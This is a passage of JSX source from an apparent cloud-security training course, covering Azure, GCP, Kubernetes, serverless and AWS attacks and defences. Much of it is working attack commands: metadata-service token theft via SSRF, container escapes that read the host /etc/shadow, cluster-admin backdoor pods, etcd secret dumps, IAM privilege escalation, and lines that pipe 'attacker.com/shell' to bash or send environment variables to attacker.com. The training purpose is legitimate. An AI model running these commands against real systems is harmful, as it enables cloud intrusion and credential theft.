$prtCookie = New-AADIntUserPRTToken -RefreshToken PRT_VALUE -SessionKey SESSION_KEY
# Use cookie in browser to get authenticated session
Open-AADIntOfficePortal -Cookie $prtCookie

# Or use the PRT to get an access token directly:
Get-AADIntAccessTokenForMSGraph -PRTToken PRT_VALUE

# Defense - detect PRT theft:
# Azure AD Sign-In logs: look for sign-ins from new device IDs
# Conditional Access: require compliant device (Intune enrollment)
# Monitor for mimikatz-like LSASS access patterns`}</Pre>

        <H3>Managed Identity SSRF</H3>
        <P>Azure Managed Identity allows Azure resources (VMs, Functions, App Service) to get access tokens without storing any credentials. The token is fetched from the Azure IMDS endpoint. If you can perform SSRF from a web app running on Azure, you can reach this endpoint and get a token for all Azure services the identity has access to.</P>
        <Pre label="// AZURE MANAGED IDENTITY TOKEN THEFT VIA SSRF">{`# Azure IMDS endpoint (instance metadata service)
# http://169.254.169.254/metadata/identity/oauth2/token
# Required header: Metadata: true

# Via SSRF - get access token for Azure Resource Manager:
# GET http://169.254.169.254/metadata/identity/oauth2/token
#   ?api-version=2018-02-01
#   &resource=https://management.azure.com/
# Header: Metadata: true

# Response contains:
{
  "access_token": "eyJ0...",
  "client_id": "MANAGED_IDENTITY_CLIENT_ID",
  "expires_in": "86399",
  "token_type": "Bearer"
}

# Use the access token to call Azure APIs from attacker machine:
curl -H "Authorization: Bearer ACCESS_TOKEN" \
  https://management.azure.com/subscriptions?api-version=2020-01-01

# Enumerate what this identity can access:
az login --identity --username MANAGED_IDENTITY_CLIENT_ID
az resource list   # all resources this identity can see
az keyvault secret list --vault-name VAULT_NAME   # if identity has access`}</Pre>

        <H3>Storage Account Attacks</H3>
        <Pre label="// AZURE STORAGE ATTACKS">{`# Enumerate storage accounts (with az login or ARM token):
az storage account list --query "[].{name:name,publicAccess:allowBlobPublicAccess}"

# Check for public blob containers:
az storage container list --account-name STORAGE_ACCOUNT_NAME --public-access blob

# Download public blobs:
az storage blob download-batch -s CONTAINER_NAME \
  --account-name STORAGE_ACCOUNT_NAME --destination ./loot/ --no-sign-request

# SAS Token abuse:
# SAS (Shared Access Signature) tokens grant time-limited access without a password
# If a SAS URL is shared externally, anyone with it has access
# Find SAS tokens in: code repos, emails, shared documents, URLs in logs

# Example SAS URL structure:
# https://STORAGE_ACCOUNT.blob.core.windows.net/CONTAINER/file.txt
#   ?sv=2021-06-08&ss=b&srt=sco&sp=rwdlacupiytfx&se=2024-12-31&st=2024-01-01&spr=https&sig=SIGNATURE

# Enumerate SAS permissions (sp parameter):
# r=read, w=write, d=delete, l=list, a=add, c=create
# Full access SAS: sp=rwdlacupiytfx`}</Pre>
      </div>
    ),
  },

  {
    id: 'cs-04',
    title: 'GCP Security and Attacks',
    difficulty: 'INTERMEDIATE',
    readTime: '14 min',
    labLink: '/modules/cloud-security/lab',
    takeaways: [
      'GCP IAM is based on service accounts rather than instance profiles - a service account with iam.serviceAccounts.actAs can impersonate any other service account in the project',
      'The Compute Engine metadata server at metadata.google.internal is the GCP equivalent of AWS IMDS - SSRF to this endpoint yields bearer tokens for any bound service account',
      'GCP bucket permissions are set at both the bucket level and object level, and uniform bucket-level access can be disabled, creating object-level ACL bypass opportunities',
      'ScoutSuite provides a comprehensive multi-cloud audit of GCP, producing an HTML report with findings categorised by service and severity',
      'GCP audit logs have three streams: Admin Activity (always on, free), Data Access (disabled by default, paid), and System Events - gaps in Data Access logging are a major blind spot',
    ],
    content: (
      <div>
        <P>GCP has a distinct identity model compared to AWS and Azure. Where AWS uses IAM users and roles and Azure uses Azure AD identities, GCP organises permissions around service accounts and IAM bindings. The hierarchical nature of GCP resources (Organization - Folders - Projects - Resources) means a single IAM binding at the organisation level cascades down to every resource in the company.</P>

        <H3>GCP Resource Hierarchy and IAM</H3>
        <Pre label="// GCP STRUCTURE">{`# ORGANIZATION (root)
# Tied to a Google Workspace or Cloud Identity domain
# Org-level IAM bindings apply to everything below

# FOLDERS
# Group projects by team/environment (Engineering/Finance/Dev/Prod)
# IAM at folder level flows down to all projects in that folder

# PROJECTS
# Primary resource container and billing unit
# Every resource (VM, bucket, function) lives in exactly one project
# Identified by PROJECT_ID (string) and PROJECT_NUMBER (numeric)

# RESOURCES
# Compute instances, Cloud Storage buckets, BigQuery datasets, etc.

# IAM BINDING structure:
# Principal (who) + Role (what) + Resource (where)
# {member: "user:alice@company.com", role: "roles/editor", resource: PROJECT_ID}

# Service Account types:
# User-managed: created by developers, have JSON key files
# Google-managed: used internally by Google services
# Default service accounts: automatically created for Compute Engine, App Engine

# Check current identity:
gcloud auth list
gcloud config get-value project
gcloud projects get-iam-policy PROJECT_ID --format=json`}</Pre>

        <H3>Dangerous GCP Permissions</H3>
        <Pre label="// HIGH-VALUE GCP PERMISSIONS">{`# iam.serviceAccounts.actAs
# Allows using a service account - can impersonate ANY service account in the project
# If you have this on a high-priv SA, you have that SA's permissions
# This is the GCP equivalent of AWS iam:PassRole

# resourcemanager.projects.setIamPolicy
# Set IAM policy on a project - add yourself as Project Owner
# Game over for the entire project

# iam.serviceAccountKeys.create
# Create a long-term JSON key for any service account
# Dump persistent credentials for any SA you can create keys for

# compute.instances.create + iam.serviceAccounts.actAs
# Launch a VM with a high-priv SA attached
# Connect to VM, query metadata server for SA token

# Privilege escalation via custom role update:
# iam.roles.update - if you can update a custom role, add permissions to it

# Cloud Function abuse:
# cloudfunctions.functions.create + iam.serviceAccounts.actAs + cloudfunctions.functions.call
# Create a function bound to an admin SA, invoke it to exfil creds`}</Pre>

        <H3>Compute Engine Metadata and SSRF</H3>
        <Pre label="// GCP METADATA SERVER EXPLOITATION">{`# GCP metadata server (accessible from within GCE instances)
# http://metadata.google.internal/computeMetadata/v1/
# Required header: Metadata-Flavor: Google

# Get service account access token:
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Returns: {"access_token": "ya29...", "expires_in": 1799, "token_type": "Bearer"}

# Get service account email:
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email

# Get project ID:
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/project/project-id

# Get all scopes the SA is authorized for:
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes

# Via SSRF - example payload for a SSRF-vulnerable app:
# Target: http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Header injection: Metadata-Flavor: Google

# Use token from attacker machine:
curl -H "Authorization: Bearer ya29..." \
  https://cloudresourcemanager.googleapis.com/v1/projects/PROJECT_ID:getIamPolicy

# Set up gcloud with stolen token:
gcloud config set auth/access_token_file /tmp/token_file
# Or set environment variable:
export CLOUDSDK_AUTH_ACCESS_TOKEN=ya29...`}</Pre>

        <H3>GCP Cloud Storage Attacks</H3>
        <Pre label="// GCS BUCKET ENUMERATION AND EXPLOITATION">{`# GCPBucketBrute - enumerate public GCS buckets
python3 GCPBucketBrute.py --keyword COMPANY_NAME --output ./results/
# Checks: COMPANY_NAME.storage.googleapis.com, gs://COMPANY_NAME-backup, etc.

# Manual bucket checks:
gsutil ls gs://BUCKET_NAME                    # list if accessible
gsutil ls -la gs://BUCKET_NAME/              # with timestamps
gsutil cp gs://BUCKET_NAME/file.txt ./loot/ # download file

# Check bucket IAM policy:
gsutil iam get gs://BUCKET_NAME
# Look for: allUsers or allAuthenticatedUsers (public access)

# Check bucket ACL:
gsutil acl get gs://BUCKET_NAME

# If bucket has uniform bucket-level access DISABLED:
# Individual objects may have different ACLs than the bucket
gsutil acl get gs://BUCKET_NAME/OBJECT_NAME

# Find public buckets in a project (with project access):
gsutil ls -p PROJECT_ID
for bucket in $(gsutil ls -p PROJECT_ID); do
  echo "Checking $bucket"
  gsutil iam get $bucket 2>/dev/null | grep -i allUsers
done`}</Pre>

        <H3>ScoutSuite - GCP Security Audit</H3>
        <Pre label="// SCOUTSUITE MULTI-CLOUD AUDIT">{`# Install ScoutSuite
pip3 install scoutsuite

# Authenticate to GCP:
gcloud auth application-default login
# Or use service account key:
export GOOGLE_APPLICATION_CREDENTIALS=/path/to/sa-key.json

# Run GCP audit:
scout gcp --report-dir ./scout-report/ --project PROJECT_ID
# Or audit all accessible projects:
scout gcp --report-dir ./scout-report/ --all-projects

# Key findings ScoutSuite checks for in GCP:
# - Service accounts with admin roles
# - Service account keys older than 90 days
# - Public Cloud Storage buckets
# - Compute instances with public IPs and no firewall rules
# - Cloud SQL instances with public IPs
# - Default service account usage (risky - has editor permissions by default)
# - Audit logging not enabled for all services
# - Cloud KMS keys not using customer-managed encryption
# - GKE clusters without network policy or RBAC
# - Firewall rules allowing 0.0.0.0/0 on sensitive ports

# Also run Prowler for GCP:
pip3 install prowler
prowler gcp --project-ids PROJECT_ID`}</Pre>

        <H3>GKE (Google Kubernetes Engine) Attacks</H3>
        <Pre label="// GKE ATTACK SURFACE">{`# Enumerate GKE clusters:
gcloud container clusters list --project PROJECT_ID
gcloud container clusters get-credentials CLUSTER_NAME --zone ZONE --project PROJECT_ID

# Check cluster configuration for weaknesses:
gcloud container clusters describe CLUSTER_NAME --zone ZONE \
  --format="value(privateClusterConfig.enablePrivateNodes,networkConfig.enableIntraNodeVisibility)"

# Workload Identity abuse:
# GKE Workload Identity binds a Kubernetes SA to a GCP SA
# If you can create a pod with a specific K8s SA, you get GCP SA permissions
# kubectl create sa attacker-sa
# kubectl annotate sa attacker-sa iam.gke.io/gcp-service-account=HIGH_PRIV_SA@PROJECT.iam.gserviceaccount.com

# From compromised pod with Workload Identity:
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Returns token for the GCP SA bound to this workload`}</Pre>
      </div>
    ),
  },

  {
    id: 'cs-05',
    title: 'Container and Kubernetes Security',
    difficulty: 'ADVANCED',
    readTime: '20 min',
    labLink: '/modules/cloud-security/lab',
    takeaways: [
      'A privileged container is essentially equivalent to running as root on the host - container security boundaries are entirely defeated',
      'The Docker socket (/var/run/docker.sock) mounted inside a container is an instant host escape - create a privileged container via the socket and mount the host filesystem',
      'etcd is the Kubernetes brain - if it is accessible without authentication (port 2379), you can extract every secret, kubeconfig, and certificate in the cluster',
      'KubeHunter and kube-bench automate attack surface enumeration and CIS benchmark checking respectively - run both at the start of any Kubernetes engagement',
      'Kubernetes secrets are only base64 encoded, not encrypted by default - anyone with secrets/list permission can read every secret in a namespace in plaintext',
    ],
    content: (
      <div>
        <P>Container security is a distinct discipline from cloud security but they intersect heavily - most cloud workloads run in containers. Understanding how containers achieve (and fail to achieve) isolation, and how Kubernetes manages them at scale, is essential for any cloud security practitioner.</P>

        <H3>Container Security Model</H3>
        <Pre label="// HOW CONTAINERS ACHIEVE ISOLATION">{`# LINUX NAMESPACES (process isolation):
# pid       - process IDs (container processes don't see host processes)
# net       - network interfaces (container gets its own network stack)
# mnt       - filesystem mounts (container sees only its own filesystem)
# uts       - hostname and domain name
# ipc       - interprocess communication (shared memory)
# user      - user and group IDs (UID remapping)

# CGROUPS (resource limiting):
# CPU, memory, disk I/O, network bandwidth limits per container
# Prevents noisy-neighbour and resource exhaustion attacks

# LINUX CAPABILITIES:
# Root in a container does NOT have all root capabilities by default
# Docker drops these by default: SYS_ADMIN, NET_ADMIN, SYS_MODULE, etc.
# --privileged flag restores ALL capabilities = full host access

# SECCOMP:
# Filter which syscalls a container can make
# Docker's default seccomp profile blocks ~44 dangerous syscalls
# Custom profiles can be more or less restrictive

# APPARMOR / SELINUX:
# Mandatory access control labels restricting file access, process operations
# Docker applies a default AppArmor profile on Ubuntu-based systems

# WHERE ISOLATION BREAKS DOWN:
# --privileged                       kills all isolation
# --pid=host                         container sees all host processes
# --network=host                     container uses host network stack
# -v /:/hostfs                       mounts entire host filesystem
# -v /var/run/docker.sock:/var/run/docker.sock  docker socket escape`}</Pre>

        <H3>Docker Container Escape Techniques</H3>
        <Pre label="// CONTAINER ESCAPE METHODS">{`# METHOD 1: Privileged Container Escape (cgroup release_agent)
# Requires: --privileged flag or SYS_ADMIN + cgroup v1

# Check if privileged:
cat /proc/self/status | grep CapEff
# 0000003fffffffff = full capabilities = privileged

# Exploit cgroup release_agent:
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/exploit" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /exploit
echo "cat /etc/shadow > $host_path/output" >> /exploit
chmod a+x /exploit
sh -c "echo 0 > /tmp/cgrp/x/cgroup.procs"
cat /output   # now contains /etc/shadow from HOST

# METHOD 2: Docker Socket Escape (most common in the wild)
# Requires: /var/run/docker.sock mounted in container
ls -la /var/run/docker.sock   # check if socket is present

# Create privileged container with host filesystem mounted:
docker -H unix:///var/run/docker.sock run -it \
  --privileged --net=host --pid=host \
  -v /:/host alpine /bin/sh

# Now inside new container, chroot to host:
chroot /host bash
# You are now root on the host system

# METHOD 3: hostPath Volume to /etc
# If pod mounts /etc from host, overwrite /etc/cron.d for persistence
# Or write SSH key to /root/.ssh/authorized_keys on host

# METHOD 4: Kubernetes nsenter (if --pid=host)
nsenter --target 1 --mount --uts --ipc --net -- bash
# PID 1 is init on the host - nsenter into its namespaces = host shell`}</Pre>

        <H3>Kubernetes Architecture and RBAC</H3>
        <Pre label="// KUBERNETES COMPONENTS">{`# API SERVER (kube-apiserver)
# Central control plane - all kubectl commands go here
# Default port: 6443 (HTTPS)
# Validates authentication, authorization (RBAC), admission control

# ETCD
# Distributed key-value store - stores ALL cluster state
# All secrets, configs, workloads stored here
# Default port: 2379 (client), 2380 (peer)
# If exposed without TLS/auth: entire cluster is compromised

# KUBELET
# Agent on every node - receives pod specs from API server
# Runs/monitors containers, serves metrics
# Default port: 10250 (HTTPS API), 10255 (HTTP read-only, deprecated)
# Unauthenticated kubelet = run commands in any pod on that node

# CONTROLLER MANAGER / SCHEDULER
# Background automation: replication, scheduling decisions

# KUBERNETES RBAC:
# Role        - namespaced permissions (can-list-pods in namespace X)
# ClusterRole - cluster-wide permissions
# RoleBinding - binds a Role to a ServiceAccount/User in a namespace
# ClusterRoleBinding - binds ClusterRole to principal cluster-wide

# Dangerous K8s permissions:
# pods/exec              - kubectl exec into any pod = code execution
# secrets/list           - list and read ALL secrets in namespace/cluster
# pods/create with hostPath   - create pod mounting host filesystem
# nodes/proxy            - proxy to kubelet API = same as kubelet access
# * wildcard             - the worst: can do anything in the namespace`}</Pre>

        <H3>Kubernetes Attack Path - Compromised Pod to Cluster Admin</H3>
        <Pre label="// KUBERNETES ATTACK CHAIN">{`# STEP 1: You compromised a pod (e.g., via RCE in a web app)
# Check the service account token:
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
# API server address:
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Set up kubectl in the pod:
APISERVER=https://kubernetes.default.svc
SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
TOKEN=$(cat $SERVICEACCOUNT/token)
CACERT=$SERVICEACCOUNT/ca.crt

# STEP 2: Enumerate what this SA can do
curl --cacert $CACERT --header "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/default/pods

# Better: check self-subject access review
kubectl auth can-i --list   # (if kubectl is available)

# STEP 3: List secrets if permitted
kubectl get secrets --all-namespaces
kubectl get secret admin-token -o jsonpath='{.data.token}' | base64 -d
# K8s secrets are ONLY base64 encoded - not encrypted

# STEP 4: If you find a cluster-admin token, use it:
kubectl --token=ADMIN_TOKEN get nodes
kubectl --token=ADMIN_TOKEN create clusterrolebinding backdoor \
  --clusterrole=cluster-admin --serviceaccount=default:attacker-sa

# STEP 5: Create persistent backdoor pod with hostPath
kubectl apply -f - <<EOF_YAML
apiVersion: v1
kind: Pod
metadata: {name: rooter}
spec:
  containers:
  - name: sh
    image: alpine
    command: [sh, -c, "nsenter --target 1 --mount --uts --ipc --net -- bash"]
    volumeMounts:
    - mountPath: /host
      name: host-vol
    securityContext: {privileged: true}
  volumes:
  - name: host-vol
    hostPath: {path: /}
  hostPID: true
EOF_YAML`}</Pre>

        <H3>etcd Attack - Extracting All Cluster Secrets</H3>
        <Pre label="// UNAUTHENTICATED ETCD EXPLOITATION">{`# Check if etcd is exposed (from inside cluster or externally):
nc -zv ETCD_IP 2379
# Or from a pod:
curl http://ETCD_IP:2379/version

# If no TLS/auth (misconfigured):
# Download etcdctl
wget https://github.com/etcd-io/etcd/releases/download/v3.5.0/etcd-v3.5.0-linux-amd64.tar.gz
export ETCDCTL_API=3

# List all keys in etcd:
etcdctl --endpoints=http://ETCD_IP:2379 get / --prefix --keys-only

# Extract all Kubernetes secrets:
etcdctl --endpoints=http://ETCD_IP:2379 get /registry/secrets --prefix

# Get a specific secret (admin kubeconfig for example):
etcdctl --endpoints=http://ETCD_IP:2379 get /registry/secrets/kube-system/admin-token

# Extract all data and grep for credentials:
etcdctl --endpoints=http://ETCD_IP:2379 get / --prefix | strings | grep -i password
etcdctl --endpoints=http://ETCD_IP:2379 get / --prefix | strings | grep -i apikey`}</Pre>

        <H3>KubeHunter, Kube-bench, and Falco</H3>
        <Pre label="// KUBERNETES SECURITY TOOLS">{`# KubeHunter - Kubernetes penetration testing
pip3 install kube-hunter
# External scan from attacker machine:
kube-hunter --remote CLUSTER_IP
# Internal scan from compromised pod:
kube-hunter --pod

# Key checks: unauthenticated API, open kubelet, etcd exposure,
# anonymous auth, privilege escalation paths

# Kube-bench - CIS Kubernetes Benchmark checks
# Run on a cluster node:
docker run --pid=host -v /etc:/etc:ro -v /var:/var:ro \
  -t aquasec/kube-bench:latest --version 1.27
# Produces PASS/FAIL/WARN per CIS control

# Peirates - Kubernetes penetration tool
# https://github.com/inguardians/peirates
./peirates
# Interactive menu: enumerate pods, steal tokens, exec into pods,
# enumerate cloud metadata, IAM roles

# Falco - runtime security for containers
# Monitors kernel syscalls, detects:
# - Shell spawned in container
# - Sensitive file reads (/etc/shadow, /proc/kcore)
# - Docker socket access
# - Network tool execution inside container (nmap, netcat)
# Custom rule example:
# - rule: Shell in Container
#   desc: Shell spawned in a container
#   condition: container and evt.type=execve and proc.name=bash
#   output: Shell spawned (user=%user.name container=%container.id)
#   priority: WARNING`}</Pre>
      </div>
    ),
  },

  {
    id: 'cs-06',
    title: 'Serverless and IaC Security',
    difficulty: 'INTERMEDIATE',
    readTime: '14 min',
    labLink: '/modules/cloud-security/lab',
    takeaways: [
      'Terraform state files (.tfstate) contain plaintext secrets - database passwords, TLS certificates, access keys - and are often stored in S3 buckets accessible to all developers',
      'Lambda event injection attacks treat API Gateway -> Lambda as an injection point - user-controlled data in the event payload that reaches shell commands or SQL queries is vulnerable',
      'Atlantis, the popular Terraform CI/CD automation tool, executes terraform plan on every PR - a malicious PR can include a data source that exfiltrates environment variables',
      'IaC scanning tools (tfsec, Checkov, KICS) should run in CI/CD pipelines before any terraform apply, catching misconfigurations before they reach production',
      'Lambda layers are a supply chain risk - a shared layer ARN can be updated by the layer owner to execute malicious code in your function on the next cold start',
    ],
    content: (
      <div>
        <P>Serverless computing and Infrastructure as Code (IaC) introduce unique security challenges. Serverless abstracts away the operating system, making traditional hardening irrelevant but creating new attack surfaces around event handling, dependency management, and credential exposure. IaC makes infrastructure repeatable but also means a single compromised Terraform module can propagate across an entire organisation.</P>

        <H3>Lambda Attack Surface</H3>
        <Pre label="// LAMBDA SECURITY VULNERABILITIES">{`# ENVIRONMENT VARIABLE SECRETS
# Lambda functions commonly store secrets in env vars
# These are visible to anyone with lambda:GetFunction permission
aws lambda get-function-configuration --function-name FUNCTION_NAME
# Look at Environment.Variables in output
# Common finds: DATABASE_URL, API_KEY, JWT_SECRET, AWS_SECRET_ACCESS_KEY

# EVENT INJECTION
# Lambda receives structured events from triggers (API Gateway, SQS, S3, SNS)
# If function passes event data to shell commands, SQL, or eval() without sanitisation:

# Example vulnerable Node.js Lambda:
# exports.handler = async (event) => {
#   const user = event.queryStringParameters.user;
#   const result = await db.query('SELECT * FROM users WHERE name = ' + user);
#   // SQL injection via API Gateway -> Lambda -> RDS
# }

# Or shell injection:
# const { exec } = require('child_process');
# exec('ping -c 1 ' + event.host);   // command injection

# LAMBDA LAYER SUPPLY CHAIN ATTACK
# Lambda layers are shared code packages (dependencies, custom runtimes)
# If you share a layer ARN externally, anyone using that ARN trusts your code
# Attacker scenario:
# 1. Publish a popular Lambda layer (e.g., "optimised-aws-sdk-layer")
# 2. Victim adds layer ARN to their function
# 3. Update layer with malicious version that exfils env vars on init
# 4. Victim's next cold start executes your code in their function context

# DEPENDENCY CONFUSION IN LAMBDA
# Private package names uploaded to public npm/PyPI
# Lambda installs from public registry instead of private
# Malicious package runs during lambda init, exfiltrates LAMBDA_TASK_ROOT contents

# OVERPRIVILEGED EXECUTION ROLE
# Lambda function should only have permissions it needs
# Common misconfiguration: assigning AdministratorAccess to Lambda role
# If function has RCE, attacker inherits admin AWS permissions`}</Pre>

        <H3>Terraform State File Attacks</H3>
        <P>Terraform maintains a state file that records the current configuration of all managed infrastructure. This file contains every value that was used to create resources - including passwords, certificates, and access keys that Terraform needed during provisioning. It is stored in plaintext JSON.</P>
        <Pre label="// TERRAFORM STATE FILE EXPLOITATION">{`# Terraform state file location:
# Default: ./terraform.tfstate (local, dangerous in git repos)
# Remote backends: S3 bucket, Terraform Cloud, Azure Blob, GCS bucket

# If the S3 backend bucket is misconfigured (public or overpermissioned):
aws s3 ls s3://COMPANY_TERRAFORM_STATE/
aws s3 cp s3://COMPANY_TERRAFORM_STATE/terraform.tfstate ./tfstate.json
# Search for secrets in state:
cat tfstate.json | python3 -m json.tool | grep -i password
cat tfstate.json | python3 -m json.tool | grep -i secret

# Common finds in Terraform state:
# RDS master password (plaintext in aws_db_instance resource)
# TLS private keys (tls_private_key resource output)
# Kubeconfig files (kubernetes cluster resources)
# SSH private keys
# Database connection strings
# API keys passed as sensitive variables

# Example state snippet showing RDS password:
# "resources": [{"type": "aws_db_instance", "instances": [{"attributes": {
#   "password": "SuperSecretDBPass123!",
#   "endpoint": "mydb.abc123.us-east-1.rds.amazonaws.com"
# }}]}]

# Recommended: use sensitive = true in Terraform outputs
# But even sensitive outputs appear in state in plaintext
# Best practice: use Secrets Manager for database passwords,
#   reference secret ARN in Terraform rather than the secret value itself`}</Pre>

        <H3>Atlantis RCE via PR Injection</H3>
        <Pre label="// ATLANTIS TERRAFORM AUTOMATION ATTACK">{`# Atlantis: open-source Terraform pull request automation
# Runs terraform plan on every PR, terraform apply when merged
# Webhook from GitHub/GitLab -> Atlantis server

# ATTACK VECTOR: Malicious terraform plan code in PR
# terraform plan executes ALL Terraform providers, data sources, and functions
# A data source that calls an external program runs during plan:

# Malicious main.tf in a PR:
# data "external" "exfil" {
#   program = ["sh", "-c",
#     "curl -s http://attacker.com/exfil?data=$(env | base64 -w0)"]
#   query = {}
# }

# When Atlantis runs 'terraform plan' on this PR:
# The external data source executes the shell command
# Atlantis environment variables (AWS creds, Vault tokens, etc.) are exfiltrated

# Why this is critical:
# Atlantis runs with cloud credentials to execute Terraform
# Often has admin-level AWS/Azure/GCP permissions
# Compromise of Atlantis = compromise of all managed infrastructure

# Defense:
# Require approved reviewers before atlantis plan runs
# Use workspace allow-list to prevent new workspaces
# Audit Atlantis environment - limit its IAM permissions
# Use repo allow-list to prevent new repos being added`}</Pre>

        <H3>IaC Security Scanning Tools</H3>
        <Pre label="// IAC SCANNING IN CI/CD">{`# tfsec - Terraform static analysis
brew install tfsec  # or pip3 install tfsec
tfsec ./terraform/
tfsec ./terraform/ --format json --out results.json
# Checks: public S3, unencrypted EBS, permissive security groups,
# missing logging, unencrypted RDS, public subnets, etc.

# Checkov - multi-framework IaC scanner (Terraform, CFn, Helm, Dockerfile)
pip3 install checkov
checkov -d ./terraform/          # scan Terraform directory
checkov -f template.yaml         # scan CloudFormation template
checkov -d ./k8s/                # scan Kubernetes manifests
checkov -f Dockerfile            # scan Dockerfile
# Output: PASSED/FAILED per check with remediation guidance

# KICS (Keeping Infrastructure as Code Secure) by Checkmarx
# Supports 20+ IaC platforms:
docker run -v ./:/path checkmarx/kics:latest scan -p /path -o /path/results.json

# Terrascan - policy as code for IaC
pip3 install terrascan
terrascan scan -t terraform -d ./terraform/ --output json

# Snyk IaC:
snyk iac test ./terraform/
# Integrates with GitHub, GitLab, Bitbucket for PR checks

# Prisma Cloud IaC (formerly Bridgecrew):
# SaaS platform with GitHub integration
# Scans PRs and blocks on policy violations`}</Pre>

        <H3>Secrets Detection in IaC Repositories</H3>
        <Pre label="// FINDING SECRETS IN CODE REPOS">{`# truffleHog - high-entropy string detection and regex-based detection
pip3 install truffleHog3
trufflehog git https://github.com/COMPANY/REPO
trufflehog filesystem ./local-repo/ --json

# git-secrets by AWS Labs - prevent secrets in commits
git secrets --install        # install git hooks
git secrets --register-aws   # add AWS credential patterns
git secrets --scan           # scan entire repo history

# detect-secrets by Yelp - auditable secret management
pip3 install detect-secrets
detect-secrets scan > .secrets.baseline   # create baseline
detect-secrets audit .secrets.baseline    # review findings

# Common IaC secret patterns to look for:
# AWS access keys: AKIA[0-9A-Z]{16}
# AWS secret keys: [0-9a-zA-Z/+]{40}
# GCP service account keys: private_key_id + private_key fields in JSON
# Azure client secrets: arbitrary strings in client_secret = ""
# Terraform variables without sensitive=true containing passwords
# CloudFormation parameters without NoEcho: true`}</Pre>
      </div>
    ),
  },

  {
    id: 'cs-07',
    title: 'Cloud Lateral Movement and Privilege Escalation',
    difficulty: 'ADVANCED',
    readTime: '16 min',
    labLink: '/modules/cloud-security/lab',
    takeaways: [
      'Cloud privilege escalation is primarily an IAM problem - finding the permission that lets you grant yourself more permissions is the core challenge',
      'Cross-account role assumption is a legitimate AWS feature that attackers abuse for lateral movement - always audit which external accounts can assume roles in your environment',
      'Hybrid environments (AD Connect, ADFS, Hybrid Azure AD join) create bidirectional attack paths - on-prem compromise leads to cloud compromise and vice versa',
      'Cloudfox automates enumeration of AWS and Azure attack surfaces, producing attack path graphs similar to BloodHound but for cloud resources',
      'Credential chaining - using one credential to obtain another - can create complex escalation chains that are difficult to follow without dedicated CIEM tooling',
    ],
    content: (
      <div>
        <P>Lateral movement in cloud environments looks fundamentally different from traditional network-based lateral movement. There are no network shares to traverse, no PTH attacks against workstations. Instead, lateral movement means assuming roles, impersonating service accounts, and chaining credentials across service boundaries. The entire attack surface is the IAM system.</P>

        <H3>AWS Lateral Movement Techniques</H3>
        <Pre label="// AWS LATERAL MOVEMENT PATHS">{`# CROSS-ACCOUNT ROLE ASSUMPTION
# Many AWS environments have multiple accounts (dev, prod, security, shared-services)
# Cross-account roles allow principals in Account A to assume roles in Account B

# Find assumable roles (check trust policies):
aws iam list-roles --query 'Roles[*].[RoleName,AssumeRolePolicyDocument]'
# Look for trust policies allowing external accounts or specific users

# Assume a cross-account role:
aws sts assume-role \
  --role-arn arn:aws:iam::TARGET_ACCOUNT_ID:role/ROLE_NAME \
  --role-session-name attacker-session

# EC2 INSTANCE PROFILE HOPPING
# Step 1: RCE in web app running on EC2 with limited role
# Step 2: Role has ec2:DescribeInstances + ssm:StartSession permission
# Step 3: Find EC2 instances with admin role attached
# Step 4: Connect via SSM Session Manager:
aws ec2 describe-iam-instance-profile-associations
# Find instance with admin role, then:
aws ssm start-session --target INSTANCE_ID
# Now running commands on that instance with its admin role

# LAMBDA INVOCATION FOR LATERAL MOVEMENT
# If you have lambda:InvokeFunction on a function with a more-privileged role:
aws lambda invoke --function-name FUNCTION_NAME \
  --payload '{"action":"whoami"}' /tmp/response.json
# The Lambda executes with its own IAM role - different from your current identity

# USING CLOUDFOX FOR ATTACK SURFACE MAPPING
git clone https://github.com/BishopFox/cloudfox
cd cloudfox && go build .
./cloudfox aws -p TARGET_PROFILE all-checks
# Produces: attack paths, exposed endpoints, secrets, role chains
./cloudfox aws -p TARGET_PROFILE iam-simulator -a '*' -r '*'
# Simulates what actions your current identity can perform`}</Pre>

        <H3>AWS Privilege Escalation Paths</H3>
        <Pre label="// AWS PRIV ESC TECHNIQUES">{`# METHOD 1: iam:CreatePolicyVersion
# If you can create a new version of any managed policy and set it as default:
aws iam create-policy-version \
  --policy-arn arn:aws:iam::ACCOUNT_ID:policy/POLICY_NAME \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default
# Now the policy grants full admin to all attached entities

# METHOD 2: iam:PassRole + ec2:RunInstances
# Launch a new EC2 instance with an admin role attached:
aws ec2 run-instances \
  --image-id ami-XXXXXXXX \
  --instance-type t2.micro \
  --iam-instance-profile Name=ADMIN_ROLE_PROFILE \
  --user-data "#!/bin/bash\ncurl attacker.com/shell | bash"
# EC2 instance metadata service provides admin credentials to your user-data script

# METHOD 3: iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction
# Create function with admin role, invoke to exfil creds:
aws lambda create-function \
  --function-name backdoor \
  --runtime python3.11 \
  --role arn:aws:iam::ACCOUNT_ID:role/ADMIN_ROLE_ARN \
  --handler index.handler \
  --zip-file fileb://payload.zip
aws lambda invoke --function-name backdoor /tmp/out.json

# METHOD 4: iam:AttachUserPolicy
# Attach AdministratorAccess managed policy to your own user:
aws iam attach-user-policy \
  --user-name YOUR_USERNAME \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# METHOD 5: iam:PutUserPolicy (inline policy)
# More stealthy than attaching managed policies (less visibility in console):
aws iam put-user-policy \
  --user-name YOUR_USERNAME \
  --policy-name backdoor-policy \
